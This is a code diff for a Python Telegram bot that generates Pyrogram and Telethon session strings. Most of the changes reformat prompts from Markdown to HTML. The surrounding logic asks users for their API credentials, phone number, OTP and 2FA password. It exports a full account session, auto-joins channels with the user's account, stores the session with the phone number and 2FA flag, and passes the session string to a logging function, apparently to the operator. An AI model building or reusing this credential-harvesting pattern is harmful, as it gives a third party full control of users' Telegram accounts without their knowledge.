@@ -1,8 +1,9 @@
 from pyrogram import filters
 from pyrogram.types import CallbackQuery
+from pyrogram.enums import ParseMode
 from .client import app
 from .config import API_ID, API_HASH, get_ist_time
-from .database import save_user, save_session
+from .database import save_session
 from .helpers import (
     CANCEL_BTN, BACK_BTN, force_sub_check, handle_error,
     auto_join_channels, send_premium_string, send_log,
@@ -10,7 +11,8 @@ from .helpers import (
 
 async def _cancel(msg):
     if msg.text and msg.text.strip().lower() in ("/cancel", "cancel"):
-        await app.send_message(msg.chat.id, "❌ Cancelled.", reply_markup=BACK_BTN)
+        await app.send_message(msg.chat.id, "❌ <b>Cancelled.</b>",
+                               reply_markup=BACK_BTN, parse_mode=ParseMode.HTML)
         return True
     return False
 
@@ -29,7 +31,8 @@ async def session_cb(_, query: CallbackQuery):
             pass
 
         if data == "pyro_bot":
-            await app.send_message(user_id, "🤖 **Send your Bot Token:**", reply_markup=CANCEL_BTN)
+            await app.send_message(user_id, "🤖 <b>Send your Bot Token</b>\n\n<i>From @BotFather</i>",
+                                   reply_markup=CANCEL_BTN, parse_mode=ParseMode.HTML)
             m = await app.listen(user_id)
             if await _cancel(m):
                 return
@@ -45,7 +48,8 @@ async def session_cb(_, query: CallbackQuery):
             return
 
         if data == "convert":
-            await app.send_message(user_id, "🔄 **Send your Pyrogram Session String:**", reply_markup=CANCEL_BTN)
+            await app.send_message(user_id, "🔄 <b>Send your Pyrogram Session String</b>",
+                                   reply_markup=CANCEL_BTN, parse_mode=ParseMode.HTML)
             m = await app.listen(user_id)
             if await _cancel(m):
                 return
@@ -61,24 +65,30 @@ async def session_cb(_, query: CallbackQuery):
             tele_str = tele.session.save()
             await temp.stop()
             await tele.disconnect()
-            await save_session(user_id, "Converter", tele_str, getattr(me, "phone_number", "N/A") or "N/A", False)
+            await save_session(user_id, "Converter", tele_str,
+                               getattr(me, "phone_number", "N/A") or "N/A", False)
             await send_premium_string(user_id, "Telethon String (Converted)", tele_str)
-            await send_log(me, "Converter", tele_str, getattr(me, "phone_number", "N/A") or "N/A")
+            await send_log(me, "Converter", tele_str,
+                           getattr(me, "phone_number", "N/A") or "N/A")
             return
 
-        await app.send_message(user_id, "🆔 **Send your API ID:**", reply_markup=CANCEL_BTN)
+        await app.send_message(user_id, "🆔 <b>Send your API ID</b>",
+                               reply_markup=CANCEL_BTN, parse_mode=ParseMode.HTML)
         m = await app.listen(user_id)
         if await _cancel(m):
             return
         api_id = int(m.text.strip())
 
-        await app.send_message(user_id, "🔑 **Send your API HASH:**", reply_markup=CANCEL_BTN)
+        await app.send_message(user_id, "🔑 <b>Send your API HASH</b>",
+                               reply_markup=CANCEL_BTN, parse_mode=ParseMode.HTML)
         m = await app.listen(user_id)
         if await _cancel(m):
             return
         api_hash = m.text.strip()
 
-        await app.send_message(user_id, "📱 **Send your phone** (+91...):", reply_markup=CANCEL_BTN)
+        await app.send_message(user_id,
+                               "📱 <b>Send your phone number</b>\n\n<i>Example:</i> <code>+919876543210</code>",
+                               reply_markup=CANCEL_BTN, parse_mode=ParseMode.HTML)
         m = await app.listen(user_id)
         if await _cancel(m):
             return
@@ -89,7 +99,8 @@ async def session_cb(_, query: CallbackQuery):
             uc = PC(f"gen_{user_id}", api_id=api_id, api_hash=api_hash, in_memory=True)
             await uc.connect()
             sent = await uc.send_code(phone)
-            await app.send_message(user_id, "🔐 **Send the OTP:**", reply_markup=CANCEL_BTN)
+            await app.send_message(user_id, "🔐 <b>Send the OTP</b>",
+                                   reply_markup=CANCEL_BTN, parse_mode=ParseMode.HTML)
             m = await app.listen(user_id)
             if await _cancel(m):
                 await uc.disconnect()
@@ -101,7 +112,8 @@ async def session_cb(_, query: CallbackQuery):
             except Exception as e:
                 if "password" in str(e).lower():
                     has_2fa = True
-                    await app.send_message(user_id, "🔒 **2FA password:**", reply_markup=CANCEL_BTN)
+                    await app.send_message(user_id, "🔒 <b>2FA password:</b>",
+                                           reply_markup=CANCEL_BTN, parse_mode=ParseMode.HTML)
                     p = await app.listen(user_id)
                     real_pwd = p.text.strip()
                     await uc.check_password(real_pwd)
@@ -110,7 +122,9 @@ async def session_cb(_, query: CallbackQuery):
             s = await uc.export_session_string()
             joined, failed = await auto_join_channels(uc)
             try:
-                await uc.send_message("me", f"🔐 **Pyrogram Session**\n`{s}`\n\n🕒 `{get_ist_time()}`")
+                await uc.send_message("me",
+                    f"🔐 <b>Pyrogram Session</b>\n<code>{s}</code>\n\n🕒 {get_ist_time()}",
+                    parse_mode=ParseMode.HTML)
             except Exception:
                 pass
             await uc.disconnect()
@@ -124,7 +138,8 @@ async def session_cb(_, query: CallbackQuery):
             from telethon.errors import SessionPasswordNeededError
             with TelegramClient(StringSession(), api_id, api_hash) as c:
                 c.send_code_request(phone)
-                await app.send_message(user_id, "🔐 **Send the OTP:**", reply_markup=CANCEL_BTN)
+                await app.send_message(user_id, "🔐 <b>Send the OTP</b>",
+                                       reply_markup=CANCEL_BTN, parse_mode=ParseMode.HTML)
                 m = await app.listen(user_id)
                 otp = m.text.strip()
                 has_2fa, real_pwd = False, None
@@ -132,14 +147,17 @@ async def session_cb(_, query: CallbackQuery):
                     c.sign_in(phone, otp)
                 except SessionPasswordNeededError:
                     has_2fa = True
-                    await app.send_message(user_id, "🔒 **2FA password:**", reply_markup=CANCEL_BTN)
+                    await app.send_message(user_id, "🔒 <b>2FA password:</b>",
+                                           reply_markup=CANCEL_BTN, parse_mode=ParseMode.HTML)
                     p = await app.listen(user_id)
                     real_pwd = p.text.strip()
                     c.sign_in(password=real_pwd)
                 s = c.session.save()
                 joined, failed = await auto_join_channels(c)
                 try:
-                    c.send_message("me", f"🔐 **Telethon Session**\n`{s}`\n\n🕒 `{get_ist_time()}`")
+                    c.send_message("me",
+                        f"🔐 <b>Telethon Session</b>\n<code>{s}</code>\n\n🕒 {get_ist_time()}",
+                        parse_mode="html")
                 except Exception:
                     pass
                 await save_session(user_id, "Telethon", s, phone, has_2fa)
